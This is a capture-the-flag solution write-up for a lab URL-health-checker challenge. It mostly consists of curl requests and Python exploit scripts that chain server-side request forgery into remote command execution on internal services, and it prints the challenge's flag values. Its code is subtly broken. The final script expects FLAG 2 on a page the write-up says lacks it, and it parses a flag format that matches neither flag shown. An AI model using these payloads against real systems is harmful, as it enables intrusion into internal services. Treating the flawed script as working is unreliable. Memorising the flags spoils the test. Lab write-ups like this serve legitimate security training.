## Solution

### Step 1: Discover SSRF (FLAG 1)

Test if the service accepts localhost URLs:

```bash
# Using curl
curl -X POST http://localhost:4010/check \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1:5001"}'
```

**Expected Response:**
```json
{
  "success": true,
  "status_code": 200,
  "body": "<html>...DUNO{67f645931cf9ea00ab2bf09a5d4119da}...</html>"
}
```

**Alternative localhost addresses:**
- `http://127.0.0.1:5001`
- `http://localhost:5001`
- `http://0.0.0.0:5001`

### Step 2: Enumerate Admin Panel (FLAG 2)

FLAG 2 requires more than just finding the admin panel - you need to enumerate its endpoints.

#### Step 2a: Find the admin panel port

```bash
# Enumerate other internal ports to find the admin panel
curl -X POST http://localhost:4010/check \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1:5002"}'
```

The admin panel home page won't show FLAG 2 directly - it only lists basic endpoints.

#### Step 2b: Check robots.txt for hints

```bash
# Good security practice: always check robots.txt
curl -X POST http://localhost:4010/check \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1:5002/robots.txt"}'
```

**Response shows:**
```
Disallow: /config
Disallow: /execute
...
```

#### Step 2c: Access the hidden /config endpoint

```bash
# Try the /config endpoint discovered in robots.txt
curl -X POST http://localhost:4010/check \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1:5002/config"}'
```

This will hint that you need `?debug=true` parameter.

#### Step 2d: Get FLAG 2 with debug parameter

```bash
# Access /config with debug parameter
curl -X POST http://localhost:4010/check \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1:5002/config?debug=true"}'
```

**Expected Response:**
```json
{
  "success": true,
  "status_code": 200,
  "body": "{\"config\": {...}, \"flag_2\": \"4dm1n_p4n3l_pwn3d\"}"
}
```

**FLAG 2:** `4dm1n_p4n3l_pwn3d` (500 points)

The config output also reveals the `/execute` endpoint for the next step.

### Step 3: Achieve RCE (FLAG 3)

#### Method 1: Direct POST via SSRF

The tricky part is sending a POST request through SSRF. We need to use a technique to make the target URL accept our payload.

```bash
# Read the flag file using command execution
# FLAG 3 is at /tmp/flag3.txt (created during Docker build, present at container start)
curl -X POST http://localhost:4010/check \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1:5002/execute?command=cat%20/tmp/flag3.txt"}'
```

**Note:** This might not work directly because `/execute` expects POST with JSON body.

#### Method 2: Using URL with embedded POST data

Since the internal service also accepts form data, we can try:

```python
import requests
import json

# We need to make the SSRF send a POST request
# One approach: Use a redirect server or data URL

# For this challenge, the internal /execute endpoint accepts both JSON and form data
# We can use query parameters as a fallback

url = "http://localhost:4010/check"

# Try to execute command via SSRF
payload = {
    "url": "http://127.0.0.1:5002/execute?command=cat%20/tmp/flag3.txt"
}

response = requests.post(url, json=payload)
print(response.json())
```

#### Method 3: Proper POST via Python requests

```python
import requests
import json
import urllib.parse

# Create a Python script to exploit SSRF properly
target = "http://localhost:4010"

# Step 1: Verify SSRF works
print("[*] Step 1: Testing SSRF...")
resp = requests.post(f"{target}/check", json={"url": "http://127.0.0.1:5001"})
print(f"[+] FLAG 1: {resp.json().get('body', '')[:500]}")

# Step 2: Access admin panel
print("\n[*] Step 2: Accessing admin panel...")
resp = requests.post(f"{target}/check", json={"url": "http://127.0.0.1:5002"})
print(f"[+] FLAG 2: {resp.json().get('body', '')[:500]}")

# Step 3: For RCE, we need to send POST to /execute endpoint
# Since we can't easily send POST via SSRF, look for GET-based command execution
# OR check if the endpoint accepts query parameters

# Try reading the status endpoint first
print("\n[*] Step 3: Checking admin status...")
resp = requests.post(f"{target}/check", json={"url": "http://127.0.0.1:5002/status"})
data = resp.json()
print(f"[+] Status: {data}")

# For RCE, we need to exploit the fact that the internal service might accept
# form data or find another way. Let's check what methods work.
print("\n[*] Step 4: Attempting RCE...")

# If the challenge accepts form-encoded data on the execute endpoint:
command = "cat /tmp/flag3.txt"
exec_url = f"http://127.0.0.1:5002/execute?command={urllib.parse.quote(command)}"

resp = requests.post(f"{target}/check", json={"url": exec_url})
print(f"[+] Response: {resp.json()}")
```

#### Method 4: Advanced - Gopher Protocol (If Supported)

Gopher protocol can be used to send arbitrary POST requests:

```bash
# Construct gopher URL to send POST request
# Format: gopher://host:port/_POST /path HTTP/1.1%0d%0a...
```

### Complete Exploit Script

```python
#!/usr/bin/env python3
"""
SSRF to RCE Exploit Script
Exploits the URL health checker to achieve RCE
"""

import requests
import json
import urllib.parse

TARGET = "http://localhost:4010"

def check_url(url):
    """Send SSRF request"""
    try:
        resp = requests.post(
            f"{TARGET}/check",
            json={"url": url},
            timeout=10
        )
        return resp.json()
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

def main():
    print("="*60)
    print("EverSec SSRF to RCE Exploit")
    print("="*60)

    # FLAG 1: Access internal info service
    print("\n[*] FLAG 1: Accessing internal info service...")
    result = check_url("http://127.0.0.1:5001")
    if result and result.get('success'):
        body = result.get('body', '')
        if 'FLAG{' in body:
            flag = body.split('FLAG{')[1].split('}')[0]
            print(f"[+] FLAG 1: FLAG{{{flag}}}")
    else:
        print("[-] Failed to get FLAG 1")

    # FLAG 2: Access internal admin panel
    print("\n[*] FLAG 2: Accessing internal admin panel...")
    result = check_url("http://127.0.0.1:5002")
    if result and result.get('success'):
        body = result.get('body', '')
        if 'FLAG{' in body:
            flag = body.split('FLAG{')[1].split('}')[0]
            print(f"[+] FLAG 2: FLAG{{{flag}}}")
    else:
        print("[-] Failed to get FLAG 2")

    # FLAG 3: Achieve RCE
    print("\n[*] FLAG 3: Attempting RCE...")

    # Try different command execution methods
    commands = [
        "cat /tmp/flag3.txt",
        "cat%20/tmp/flag3.txt",
        "ls -la /tmp",
    ]

    for cmd in commands:
        # The internal service accepts form data, so we can pass as query param
        # This is a simplified approach - in real scenarios you'd use gopher://
        print(f"[*] Trying command: {cmd}")

        # Note: This might require the internal service to accept GET with params
        # or form data. Check the actual implementation.
        result = check_url(f"http://127.0.0.1:5002/execute?command={cmd}")

        if result:
            print(f"[+] Response: {json.dumps(result, indent=2)}")

            # Check for FLAG in response
            response_str = json.dumps(result)
            if 'FLAG{' in response_str:
                flag = response_str.split('FLAG{')[1].split('}')[0]
                print(f"[+] FLAG 3: FLAG{{{flag}}}")
                break

    print("\n" + "="*60)
    print("Exploit Complete!")
    print("="*60)

if __name__ == '__main__':
    main()
```

### Alternative: Browser-Based Exploitation

1. Open http://localhost:4010
2. Change the URL input to: `http://127.0.0.1:5001`
3. Click "Check URL Health"
4. FLAG 1 appears in the response body
5. Change URL to: `http://127.0.0.1:5002`
6. FLAG 2 appears in the response
7. For FLAG 3, note the `/execute` endpoint details
8. Try: `http://127.0.0.1:5002/execute?command=cat%20/tmp/flag3.txt`